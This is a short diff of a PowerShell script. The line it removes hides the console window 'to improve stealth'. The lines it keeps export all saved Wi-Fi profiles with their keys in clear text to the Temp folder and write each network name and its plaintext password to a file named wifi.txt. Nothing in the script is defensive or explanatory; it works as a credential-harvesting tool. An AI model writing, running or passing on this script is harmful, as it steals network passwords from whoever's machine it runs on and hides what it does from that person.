@@ -1,6 +1,5 @@
 
 cls # clear console to improve stealth
-powershell -nop -c "$sig='[DllImport(\"user32.dll\")]public static extern bool ShowWindowAsync(IntPtr hWnd,int nCmdShow);[DllImport(\"kernel32.dll\")]public static extern IntPtr GetConsoleWindow();';Add-Type -MemberDefinition $sig -Name Win -Namespace Win32;[Win32.Win]::ShowWindowAsync([Win32.Win]::GetConsoleWindow(),2)"
 
 
 $e="$env:LOCALAPPDATA\Temp"; netsh wlan export profile key=clear folder=$e | Out-Null; Get-ChildItem "$e\Wi-Fi*.xml" | %{$x=[xml](gc $_); "SSID:$($x.WLANProfile.SSIDConfig.SSID.name) | Password:$($x.WLANProfile.MSM.security.sharedKey.keyMaterial)"} > "$e\wifi.txt"
